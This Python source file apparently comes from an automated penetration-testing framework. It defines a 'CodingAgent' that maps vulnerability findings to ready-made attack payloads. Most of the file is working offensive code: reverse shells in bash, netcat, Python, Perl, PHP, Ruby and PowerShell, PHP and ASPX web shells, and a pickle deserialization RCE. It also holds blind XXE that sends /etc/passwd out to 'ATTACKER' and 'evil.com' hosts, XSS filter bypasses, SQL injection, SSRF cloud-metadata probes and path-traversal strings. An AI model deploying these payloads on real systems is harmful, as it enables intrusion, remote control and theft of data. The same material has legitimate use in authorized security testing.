from __future__ import annotations

import base64
import json
import re
import hashlib
from typing import Dict, List, Optional, Any, Tuple
from uuid import uuid4
from enum import Enum

from pentest_schemas import (
    PentestTask,
    AgentResult,
    Finding,
    Evidence,
    Confidence,
    Severity,
    FindingStatus,
    TaskType,
)
from agents.base import BasePentestAgent, AgentContext

try:
    from langgraph.graph import StateGraph, END
    from langgraph.graph.state import CompiledStateGraph
except Exception:  # pragma: no cover
    StateGraph = None  # type: ignore
    END = None  # type: ignore
    CompiledStateGraph = None  # type: ignore


class PayloadType(str, Enum):
    """Types of payloads the agent can generate."""
    REVERSE_SHELL = "reverse_shell"
    WEB_SHELL = "web_shell"
    SQL_INJECTION = "sql_injection"
    XSS = "xss"
    XXE = "xxe"
    COMMAND_INJECTION = "command_injection"
    FILE_UPLOAD = "file_upload"
    DESERIALIZATION = "deserialization"
    BUFFER_OVERFLOW = "buffer_overflow"
    PRIVILEGE_ESCALATION = "privilege_escalation"
    PERSISTENCE = "persistence"
    DATA_EXFILTRATION = "data_exfiltration"
    BYPASS = "bypass"
    CUSTOM = "custom"


class Platform(str, Enum):
    """Target platforms for exploits."""
    LINUX = "linux"
    WINDOWS = "windows"
    MACOS = "macos"
    ANDROID = "android"
    IOS = "ios"
    WEB = "web"
    EMBEDDED = "embedded"
    CLOUD = "cloud"


def _gen_id() -> str:
    return uuid4().hex


class CodingAgent(BasePentestAgent):
    """Advanced coding agent for generating exploits, payloads, and malware.
    
    This agent creates offensive security code based on vulnerability information,
    including:
    - Reverse shells and bind shells
    - Web shells and backdoors
    - SQL injection payloads
    - XSS payloads with various bypasses
    - XXE payloads
    - Command injection exploits
    - Buffer overflow exploits
    - Privilege escalation scripts
    - Persistence mechanisms
    - Data exfiltration tools
    - WAF/IDS bypass techniques
    - Custom malware and exploits
    """

    def __init__(self, tools: Optional[List] = None):
        super().__init__(name="coding", tools=tools)
        self.payload_templates = self._init_payload_templates()
        self.bypass_techniques = self._init_bypass_techniques()
        self.obfuscation_methods = self._init_obfuscation_methods()

    async def _execute(self, task: PentestTask, result: AgentResult, ctx: AgentContext) -> None:
        """Generate exploits and payloads based on vulnerability information."""
        vulnerabilities = task.hints.get("vulnerabilities", [])
        findings = task.hints.get("findings", [])
        target_info = task.hints.get("target_info", {})
        
        # Extract vulnerability details from findings
        vuln_details = self._extract_vulnerability_details(findings, vulnerabilities)
        
        # Determine target platform and environment
        platform = self._detect_platform(target_info, task.target)
        
        # Generate appropriate payloads for each vulnerability
        generated_code = []
        for vuln in vuln_details:
            payloads = await self._generate_payload_for_vulnerability(
                vuln, platform, task.target, ctx
            )
            generated_code.extend(payloads)
        
        # Create findings with generated exploits
        for code_item in generated_code:
            finding = self._create_exploit_finding(code_item, task)
            result.findings.append(finding)
            
        # Log summary
        self.log(result, f"Generated {len(generated_code)} exploits/payloads")
        self.log(result, f"Target platform: {platform.value}")
        
        # Store generated code artifacts
        result.metrics.tool_invocations["code_generation"] = len(generated_code)

    def _extract_vulnerability_details(self, findings: List[Finding], vulnerabilities: List[Dict]) -> List[Dict]:
        """Extract and consolidate vulnerability information."""
        vuln_list = []
        
        # Process findings
        for finding in findings:
            vuln_info = {
                "category": finding.category,
                "title": finding.title,
                "url": finding.url,
                "param": finding.param,
                "severity": finding.severity.value,
                "confidence": finding.confidence.value,
                "evidence": finding.evidence,
                "status": finding.status.value,
            }
            vuln_list.append(vuln_info)
        
        # Process additional vulnerability data
        for vuln in vulnerabilities:
            vuln_list.append(vuln)
            
        return vuln_list

    def _detect_platform(self, target_info: Dict, target) -> Platform:
        """Detect the target platform based on available information."""
        # Check explicit platform info
        if "platform" in target_info:
            platform_str = target_info["platform"].lower()
            for p in Platform:
                if p.value in platform_str:
                    return p
        
        # Check from headers or other indicators
        if "headers" in target_info:
            headers = target_info["headers"]
            if "Server" in headers:
                server = headers["Server"].lower()
                if "iis" in server or "asp" in server:
                    return Platform.WINDOWS
                elif "apache" in server or "nginx" in server:
                    return Platform.LINUX
        
        # Default to web for web-based targets
        if hasattr(target, "base_url") and target.base_url:
            return Platform.WEB
            
        return Platform.LINUX  # Default

    async def _generate_payload_for_vulnerability(
        self, vuln: Dict, platform: Platform, target, ctx: AgentContext
    ) -> List[Dict]:
        """Generate appropriate payloads for a specific vulnerability."""
        payloads = []
        category = vuln.get("category", "").lower()
        
        # SQL Injection
        if "sql" in category:
            payloads.extend(self._generate_sqli_payloads(vuln, platform))
            
        # XSS
        elif "xss" in category:
            payloads.extend(self._generate_xss_payloads(vuln))
            
        # Command Injection
        elif "command" in category or "rce" in category:
            payloads.extend(self._generate_command_injection_payloads(vuln, platform))
            
        # XXE
        elif "xxe" in category:
            payloads.extend(self._generate_xxe_payloads(vuln))
            
        # File Upload
        elif "upload" in category:
            payloads.extend(self._generate_file_upload_payloads(vuln, platform))
            
        # Deserialization
        elif "deserial" in category:
            payloads.extend(self._generate_deserialization_payloads(vuln, platform))
            
        # SSRF
        elif "ssrf" in category:
            payloads.extend(self._generate_ssrf_payloads(vuln))
            
        # Path Traversal
        elif "traversal" in category or "lfi" in category:
            payloads.extend(self._generate_path_traversal_payloads(vuln, platform))
            
        # Generic RCE
        elif vuln.get("severity") in ["high", "critical"]:
            payloads.extend(self._generate_generic_rce_payloads(vuln, platform))
            
        return payloads

    def _create_exploit_finding(self, code_item: Dict, task: PentestTask) -> Finding:
        """Create a finding from generated exploit code."""
        return Finding(
            id=_gen_id(),
            category="exploit_code",
            title=code_item.get("name", "Generated Exploit"),
            description=code_item.get("description", "Automatically generated exploit code"),
            url=code_item.get("vulnerability", {}).get("url"),
            param=code_item.get("vulnerability", {}).get("param"),
            evidence=[
                Evidence(
                    notes=f"Code:\n{code_item.get('code', '')}\n\nUsage: {code_item.get('usage', '')}",
                    artifact_path=code_item.get("file_path"),
                )
            ],
            confidence=Confidence.HIGH,
            severity=Severity.CRITICAL,
            status=FindingStatus.CONFIRMED,
            source_tool="coding_agent",
        )

    def _generate_sqli_payloads(self, vuln: Dict, platform: Platform) -> List[Dict]:
        """Generate SQL injection payloads."""
        payloads = []
        url = vuln.get("url", "")
        param = vuln.get("param", "")
        
        # Basic union-based payload
        union_payload = {
            "type": PayloadType.SQL_INJECTION,
            "name": "Union-based SQLi",
            "vulnerability": vuln,
            "code": f"' UNION SELECT 1,2,3,4,5--\n' UNION SELECT NULL,NULL,NULL--\n' UNION SELECT database(),user(),version()--",
            "description": "Union-based SQL injection for data extraction",
            "usage": f"Use in parameter {param} at {url}",
        }
        payloads.append(union_payload)
        
        # Time-based blind payload
        time_payload = {
            "type": PayloadType.SQL_INJECTION,
            "name": "Time-based Blind SQLi",
            "vulnerability": vuln,
            "code": "' AND SLEEP(5)--\n' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--\n' WAITFOR DELAY '0:0:5'--",
            "description": "Time-based blind SQL injection for confirmation",
            "usage": "Confirms SQLi when response is delayed",
        }
        payloads.append(time_payload)
        
        # Boolean-based blind payload
        bool_payload = {
            "type": PayloadType.SQL_INJECTION,
            "name": "Boolean-based Blind SQLi",
            "vulnerability": vuln,
            "code": "' AND 1=1--\n' AND 1=2--\n' AND SUBSTRING(database(),1,1)='a'--",
            "description": "Boolean-based blind SQL injection",
            "usage": "Extract data character by character",
        }
        payloads.append(bool_payload)
        
        return payloads

    def _generate_xss_payloads(self, vuln: Dict) -> List[Dict]:
        """Generate XSS payloads with various bypass techniques."""
        payloads = []
        
        # Basic payload
        basic_xss = {
            "type": PayloadType.XSS,
            "name": "Basic XSS",
            "vulnerability": vuln,
            "code": "<script>alert(document.domain)</script>",
            "description": "Basic XSS payload",
            "usage": "Test for reflected/stored XSS",
        }
        payloads.append(basic_xss)
        
        # Event handler payload
        event_xss = {
            "type": PayloadType.XSS,
            "name": "Event Handler XSS",
            "vulnerability": vuln,
            "code": '<img src=x onerror="alert(1)">\n<svg onload="alert(1)">\n<body onload="alert(1)">',
            "description": "XSS using various event handlers",
            "usage": "Use when script tags are filtered",
        }
        payloads.append(event_xss)
        
        # Filter bypass payloads
        bypass_xss = {
            "type": PayloadType.XSS,
            "name": "XSS Filter Bypass Collection",
            "vulnerability": vuln,
            "code": self._get_xss_bypass_collection(),
            "description": "Collection of XSS filter bypass techniques",
            "usage": "Try different payloads when WAF/filters are present",
        }
        payloads.append(bypass_xss)
        
        return payloads

    def _generate_command_injection_payloads(self, vuln: Dict, platform: Platform) -> List[Dict]:
        """Generate command injection and RCE payloads."""
        payloads = []
        
        # Reverse shells
        if platform == Platform.LINUX:
            shells = self._get_linux_reverse_shells()
        elif platform == Platform.WINDOWS:
            shells = self._get_windows_reverse_shells()
        else:
            shells = self._get_generic_reverse_shells()
            
        for shell_name, shell_code in shells.items():
            payloads.append({
                "type": PayloadType.REVERSE_SHELL,
                "name": f"Reverse Shell: {shell_name}",
                "vulnerability": vuln,
                "code": shell_code,
                "description": f"{shell_name} reverse shell for {platform.value}",
                "usage": "Replace LHOST and LPORT with your listener",
            })
        
        # Web shells
        if platform in [Platform.WEB, Platform.LINUX]:
            web_shell = self._get_php_web_shell()
            payloads.append({
                "type": PayloadType.WEB_SHELL,
                "name": "PHP Web Shell",
                "vulnerability": vuln,
                "code": web_shell,
                "description": "Minimal PHP web shell with password protection",
                "usage": "Upload and access via web browser",
            })
        
        return payloads

    def _generate_xxe_payloads(self, vuln: Dict) -> List[Dict]:
        """Generate XXE payloads."""
        payloads = []
        
        # Basic XXE
        basic_xxe = {
            "type": PayloadType.XXE,
            "name": "Basic XXE",
            "vulnerability": vuln,
            "code": '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<data>&xxe;</data>''',
            "description": "Basic XXE for file reading",
            "usage": "Read local files through XML parsing",
        }
        payloads.append(basic_xxe)
        
        # Blind XXE
        blind_xxe = {
            "type": PayloadType.XXE,
            "name": "Blind XXE",
            "vulnerability": vuln,
            "code": '''<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://ATTACKER/evil.dtd"> %xxe;]>
<data>test</data>

<!-- evil.dtd content: -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://ATTACKER/?x=%file;'>">
%eval;
%exfiltrate;''',
            "description": "Blind XXE with OOB data exfiltration",
            "usage": "Use when direct output is not visible",
        }
        payloads.append(blind_xxe)
        
        return payloads

    def _generate_file_upload_payloads(self, vuln: Dict, platform: Platform) -> List[Dict]:
        """Generate file upload exploitation payloads."""
        payloads = []
        
        # PHP shell
        if platform in [Platform.WEB, Platform.LINUX]:
            php_shell = {
                "type": PayloadType.FILE_UPLOAD,
                "name": "PHP Shell Upload",
                "vulnerability": vuln,
                "code": self._get_php_web_shell(),
                "description": "PHP web shell",
                "usage": "Upload as .php, .phtml, .php3, .php5",
            }
            payloads.append(php_shell)
        
        # ASP/ASPX shell
        if platform == Platform.WINDOWS:
            aspx_shell = {
                "type": PayloadType.FILE_UPLOAD,
                "name": "ASPX Shell Upload",
                "vulnerability": vuln,
                "code": self._get_aspx_shell(),
                "description": "ASPX web shell for IIS",
                "usage": "Upload as .aspx, .asmx, .ashx",
            }
            payloads.append(aspx_shell)
        
        return payloads

    def _generate_deserialization_payloads(self, vuln: Dict, platform: Platform) -> List[Dict]:
        """Generate deserialization exploitation payloads."""
        payloads = []
        
        # Python pickle
        if "python" in str(vuln).lower() or "pickle" in str(vuln).lower():
            pickle_payload = {
                "type": PayloadType.DESERIALIZATION,
                "name": "Python Pickle RCE",
                "vulnerability": vuln,
                "code": '''import pickle
import base64
import os

class RCE:
    def __reduce__(self):
        cmd = ('bash -c "bash -i >& /dev/tcp/LHOST/LPORT 0>&1"')
        return os.system, (cmd,)

# Generate payload
if __name__ == '__main__':
    pickled = pickle.dumps(RCE())
    print(base64.urlsafe_b64encode(pickled))''',
                "description": "Python pickle deserialization RCE",
                "usage": "Base64 encode and send to vulnerable endpoint",
            }
            payloads.append(pickle_payload)
        
        # PHP deserialization
        if "php" in str(vuln).lower():
            php_payload = {
                "type": PayloadType.DESERIALIZATION,
                "name": "PHP Object Injection",
                "vulnerability": vuln,
                "code": 'O:8:"Example":1:{s:4:"data";s:28:"system(\'cat /etc/passwd\');";}',
                "description": "PHP object injection payload",
                "usage": "Send serialized payload to vulnerable parameter",
            }
            payloads.append(php_payload)
        
        return payloads

    def _generate_ssrf_payloads(self, vuln: Dict) -> List[Dict]:
        """Generate SSRF exploitation payloads."""
        payloads = []
        
        # Basic SSRF
        basic_ssrf = {
            "type": PayloadType.CUSTOM,
            "name": "SSRF Internal Scan",
            "vulnerability": vuln,
            "code": '''# Common SSRF targets:
http://127.0.0.1:80
http://localhost:22
http://192.168.1.1
http://10.0.0.1
http://172.16.0.1

# Cloud metadata endpoints:
http://169.254.169.254/latest/meta-data/
http://metadata.google.internal/computeMetadata/v1/
http://169.254.169.254/metadata/v1/

# File access:
file:///etc/passwd
file://C:/Windows/System32/drivers/etc/hosts''',
            "description": "SSRF for internal network scanning",
            "usage": "Enumerate internal services",
        }
        payloads.append(basic_ssrf)
        
        return payloads

    def _generate_path_traversal_payloads(self, vuln: Dict, platform: Platform) -> List[Dict]:
        """Generate path traversal/LFI payloads."""
        payloads = []
        
        # Basic traversal
        traversal_payload = {
            "type": PayloadType.CUSTOM,
            "name": "Path Traversal",
            "vulnerability": vuln,
            "code": '''# Linux targets:
../../../etc/passwd
....//....//....//etc/passwd
..%252f..%252f..%252fetc%252fpasswd
/var/www/../../etc/passwd

# Windows targets:
..\\..\\..\\windows\\system32\\drivers\\etc\\hosts
..%5c..%5c..%5cwindows%5csystem32%5cdrivers%5cetc%5chosts
C:\\..\\..\\windows\\win.ini''',
            "description": "Path traversal patterns",
            "usage": "Read sensitive files",
        }
        payloads.append(traversal_payload)
        
        return payloads

    def _generate_generic_rce_payloads(self, vuln: Dict, platform: Platform) -> List[Dict]:
        """Generate generic RCE payloads when specific vulnerability type is unknown."""
        payloads = []
        
        # Multi-language reverse shell
        multi_shell = {
            "type": PayloadType.REVERSE_SHELL,
            "name": "Multi-Language Reverse Shell",
            "vulnerability": vuln,
            "code": self._get_multi_language_reverse_shell(),
            "description": "Reverse shell that works in multiple languages",
            "usage": "Try when language/environment is unknown",
        }
        payloads.append(multi_shell)
        
        return payloads

    # Helper methods for generating specific payloads
    def _get_linux_reverse_shells(self) -> Dict[str, str]:
        """Get Linux reverse shell payloads."""
        return {
            "bash": "bash -i >& /dev/tcp/LHOST/LPORT 0>&1",
            "bash_base64": "echo 'YmFzaCAtaSA+JiAvZGV2L3RjcC9MSE9TVC9MUE9SVCAwPiYx' | base64 -d | bash",
            "nc": "nc -e /bin/bash LHOST LPORT",
            "nc_mkfifo": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc LHOST LPORT >/tmp/f",
            "python": '''python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("LHOST",LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])' ''',
            "perl": '''perl -e 'use Socket;$i="LHOST";$p=LPORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};' ''',
            "php": '''php -r '$sock=fsockopen("LHOST",LPORT);exec("/bin/sh -i <&3 >&3 2>&3");' ''',
            "ruby": '''ruby -rsocket -e'f=TCPSocket.open("LHOST",LPORT).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)' ''',
        }

    def _get_windows_reverse_shells(self) -> Dict[str, str]:
        """Get Windows reverse shell payloads."""
        return {
            "powershell": '''powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('LHOST',LPORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()" ''',
            "powershell_base64": "powershell -e <BASE64_ENCODED_PAYLOAD>",
            "nc": "nc.exe -e cmd.exe LHOST LPORT",
            "ncat": "ncat.exe LHOST LPORT -e cmd.exe",
        }

    def _get_generic_reverse_shells(self) -> Dict[str, str]:
        """Get generic reverse shell payloads."""
        return {
            "netcat": "nc LHOST LPORT -e /bin/sh",
            "telnet": "telnet LHOST LPORT | /bin/bash | telnet LHOST LPORT+1",
            "socat": "socat tcp-connect:LHOST:LPORT exec:'/bin/sh',pty,stderr,setsid,sigint,sane",
        }

    def _get_php_web_shell(self) -> str:
        """Get PHP web shell code."""
        return '''<?php
// Minimal PHP Web Shell
$password = 'c0d1ng4g3nt'; // Change this!
if (!isset($_POST['pass']) || $_POST['pass'] !== $password) {
    die('Access Denied');
}

if (isset($_POST['cmd'])) {
    $cmd = $_POST['cmd'];
    $output = shell_exec($cmd . ' 2>&1');
    echo "<pre>$output</pre>";
}
?>
<form method="POST">
    Password: <input type="password" name="pass"><br>
    Command: <input type="text" name="cmd" size="50">
    <input type="submit" value="Execute">
</form>'''

    def _get_aspx_shell(self) -> str:
        """Get ASPX web shell code."""
        return '''<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<script runat="server">
    protected void Page_Load(object sender, EventArgs e)
    {
        string password = "c0d1ng4g3nt"; // Change this!
        if (Request["pass"] != password) {
            Response.Write("Access Denied");
            return;
        }
        
        if (!string.IsNullOrEmpty(Request["cmd"])) {
            Process proc = new Process();
            proc.StartInfo.FileName = "cmd.exe";
            proc.StartInfo.Arguments = "/c " + Request["cmd"];
            proc.StartInfo.UseShellExecute = false;
            proc.StartInfo.RedirectStandardOutput = true;
            proc.Start();
            string output = proc.StandardOutput.ReadToEnd();
            Response.Write("<pre>" + output + "</pre>");
        }
    }
</script>
<form method="POST">
    Password: <input type="password" name="pass"><br>
    Command: <input type="text" name="cmd" size="50">
    <input type="submit" value="Execute">
</form>'''

    def _get_xss_bypass_collection(self) -> str:
        """Get collection of XSS bypass techniques."""
        return '''<!-- XSS Filter Bypass Collection -->
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<iframe src="javascript:alert(1)">
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>

<!-- Unicode/Encoding Bypasses -->
<script>\u0061lert(1)</script>
<script>\x61lert(1)</script>
<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>

<!-- Case Variations -->
<ScRiPt>alert(1)</ScRiPt>
<IMG SRC=x onerror="alert(1)">

<!-- HTML5 -->
<video><source onerror="alert(1)">
<audio src=x onerror=alert(1)>
<input autofocus onfocus=alert(1)>
<select autofocus onfocus=alert(1)>
<textarea autofocus onfocus=alert(1)>
<keygen autofocus onfocus=alert(1)>

<!-- Data URIs -->
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
<embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">

<!-- Bypassing specific filters -->
<script>alert`1`</script>
<script>alert(/1/)</script>
<script>alert(String.fromCharCode(88,83,83))</script>
<script>\u0061\u006C\u0065\u0072\u0074(1)</script>

<!-- Without parentheses -->
<script>setTimeout`alert\\x281\\x29`</script>
<script>onerror=alert;throw 1</script>'''

    def _get_multi_language_reverse_shell(self) -> str:
        """Get multi-language reverse shell."""
        return '''#!/bin/bash
# Multi-Language Reverse Shell
# Tries multiple methods to establish reverse shell

LHOST="CHANGE_ME"
LPORT="CHANGE_ME"

# Try bash
if command -v bash > /dev/null 2>&1; then
    bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1 2>/dev/null &
fi

# Try nc
if command -v nc > /dev/null 2>&1; then
    nc -e /bin/sh $LHOST $LPORT 2>/dev/null &
fi

# Try python
if command -v python > /dev/null 2>&1; then
    python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('$LHOST',$LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/sh','-i'])" 2>/dev/null &
fi

# Try perl
if command -v perl > /dev/null 2>&1; then
    perl -e "use Socket;\$i='$LHOST';\$p=$LPORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp'));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,'>&S');open(STDOUT,'>&S');open(STDERR,'>&S');exec('/bin/sh -i');};" 2>/dev/null &
fi

# Try PHP
if command -v php > /dev/null 2>&1; then
    php -r "\$sock=fsockopen('$LHOST',$LPORT);exec('/bin/sh -i <&3 >&3 2>&3');" 2>/dev/null &
fi

# Try Ruby
if command -v ruby > /dev/null 2>&1; then
    ruby -rsocket -e "f=TCPSocket.open('$LHOST',$LPORT).to_i;exec sprintf('/bin/sh -i <&%d >&%d 2>&%d',f,f,f)" 2>/dev/null &
fi'''

    def _init_payload_templates(self) -> Dict[str, Any]:
        """Initialize payload templates."""
        return {
            "sqli_union": "' UNION SELECT {columns}--",
            "sqli_time": "' AND SLEEP(5)--",
            "sqli_boolean": "' AND 1=1--",
            "xss_basic": "<script>alert(document.domain)</script>",
            "xss_event_handlers": '<img src=x onerror="alert(1)">',
            "xxe_basic": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><data>&xxe;</data>',
            "xxe_blind": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://evil.com/evil.dtd"> %xxe;]>',
            "xxe_ssrf": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://internal-service/">]><data>&xxe;</data>',
            "htaccess_shell": '''AddType application/x-httpd-php .jpg
# Then upload shell.jpg with PHP code''',
            "path_traversal": {
                "basic": "../../../etc/passwd",
                "encoded": "..%2F..%2F..%2Fetc%2Fpasswd",
                "double_encoded": "..%252f..%252f..%252fetc%252fpasswd",
                "unicode": "..\\u002f..\\u002f..\\u002fetc\\u002fpasswd",
            },
            "ssrf_scan": "http://127.0.0.1:{port}",
            "ssrf_cloud_metadata": "http://169.254.169.254/latest/meta-data/",
        }

    def _init_bypass_techniques(self) -> Dict[str, Dict[str, str]]:
        """Initialize bypass techniques for various attack types."""
        return {
            "xss": {
                "double_encoding": "%253Cscript%253Ealert(1)%253C%252Fscript%253E",
                "html_entities": "&lt;script&gt;alert(1)&lt;/script&gt;",
                "unicode": "\\u003cscript\\u003ealert(1)\\u003c/script\\u003e",
                "case_mixing": "<ScRiPt>alert(1)</sCrIpT>",
                "null_bytes": "<scri%00pt>alert(1)</scri%00pt>",
            },
            "command_injection": {
                "semicolon": "; whoami",
                "pipe": "| whoami",
                "ampersand": "& whoami",
                "double_ampersand": "&& whoami",
                "double_pipe": "|| whoami",
                "backticks": "`whoami`",
                "dollar": "$(whoami)",
                "newline": "\\nwhoami",
            },
            "sql": {
                "space_bypass": "'/**/UNION/**/SELECT/**/1--",
                "comment_bypass": "'/*!UNION*//*!SELECT*/1--",
                "keyword_bypass": "'UnIoN/**/SeLeCt/**/1--",
            },
        }

    def _init_obfuscation_methods(self) -> Dict[str, Any]:
        """Initialize obfuscation methods."""
        return {
            "base64": lambda x: base64.b64encode(x.encode()).decode(),
            "hex": lambda x: x.encode().hex(),
            "url_encode": lambda x: ''.join('%{:02x}'.format(ord(c)) for c in x),
            "unicode": lambda x: ''.join('\\u{:04x}'.format(ord(c)) for c in x),
            "html_entities": lambda x: ''.join('&#x{:x};'.format(ord(c)) for c in x),
        }

    def _build_graph(self) -> Optional[CompiledStateGraph]:
        """Build LangGraph state graph for the agent."""
        if StateGraph is None:
            return None

        g = StateGraph(dict)

        async def analyze_vulnerabilities(state: Dict[str, Any]) -> Dict[str, Any]:
            task: PentestTask = state["task"]
            state["vulnerabilities"] = task.hints.get("vulnerabilities", [])
            state["findings"] = task.hints.get("findings", [])
            state["target_info"] = task.hints.get("target_info", {})
            return state

        async def detect_platform(state: Dict[str, Any]) -> Dict[str, Any]:
            task: PentestTask = state["task"]
            target_info = state["target_info"]
            state["platform"] = self._detect_platform(target_info, task.target)
            return state

        async def generate_exploits(state: Dict[str, Any]) -> Dict[str, Any]:
            task: PentestTask = state["task"]
            result: AgentResult = state["result"]
            ctx: AgentContext = state["ctx"]
            vulnerabilities = state["vulnerabilities"]
            findings = state["findings"]
            platform = state["platform"]
            
            vuln_details = self._extract_vulnerability_details(findings, vulnerabilities)
            generated_code = []
            
            for vuln in vuln_details:
                payloads = await self._generate_payload_for_vulnerability(
                    vuln, platform, task.target, ctx
                )
                generated_code.extend(payloads)
            
            state["generated_code"] = generated_code
            return state

        async def create_findings(state: Dict[str, Any]) -> Dict[str, Any]:
            task: PentestTask = state["task"]
            result: AgentResult = state["result"]
            generated_code = state.get("generated_code", [])
            platform = state.get("platform", Platform.LINUX)
            
            for code_item in generated_code:
                finding = self._create_exploit_finding(code_item, task)
                result.findings.append(finding)
            
            self.log(result, f"Generated {len(generated_code)} exploits/payloads")
            self.log(result, f"Target platform: {platform.value}")
            result.metrics.tool_invocations["code_generation"] = len(generated_code)
            
            return state

        g.add_node("analyze", analyze_vulnerabilities)
        g.add_node("detect_platform", detect_platform)
        g.add_node("generate", generate_exploits)
        g.add_node("finalize", create_findings)
        
        g.set_entry_point("analyze")
        g.add_edge("analyze", "detect_platform")
        g.add_edge("detect_platform", "generate")
        g.add_edge("generate", "finalize")
        g.add_edge("finalize", END)
        
        return g.compile()


__all__ = ["CodingAgent", "PayloadType", "Platform"]
